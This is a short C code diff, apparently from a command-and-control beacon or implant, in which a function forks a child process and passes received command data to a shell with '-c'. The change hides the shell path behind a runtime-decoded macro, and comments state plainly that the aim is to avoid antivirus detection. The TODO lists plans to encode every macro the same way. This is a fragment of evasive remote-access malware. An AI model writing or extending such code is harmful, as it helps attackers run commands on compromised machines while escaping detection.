@@ -1,6 +1,7 @@
 /*
     TODO:
-        - I need to implement use of SLEEP and TIMEOUT (from macros.h/malfoy, idk how i'll do that)
+        - I need to implement correct parsing (b64) from MACROS in decodeMacro
+        - I need to correct parseInt from every INT macro, as i'll use the malfoy to encode every macro and spell option :(
 
 */
 
@@ -520,8 +521,8 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
         return 0;
 
     } else if (procPID == 0) { // The following block looks complex and it's complex hahaha, i take 3 hours to do that s**t D:<
-        char *cmd = BIN_SH_PATH;
-        char *_tmp_array1[] = {BIN_SH_PATH, "-c"}; // No way that "-c" hardcoded will result in AV Flags, it's just 2 chars
+        char *cmd = decodeMacro(BIN_SH_PATH, payloadEncoderID);
+        char *_tmp_array1[] = {cmd, "-c"}; // No way that "-c" hardcoded will result in AV Flags, it's just 2 chars
         int _tmp_array1Len = sizeof(_tmp_array1) / sizeof(_tmp_array1[0]);
 
         int _dataArrayLen;
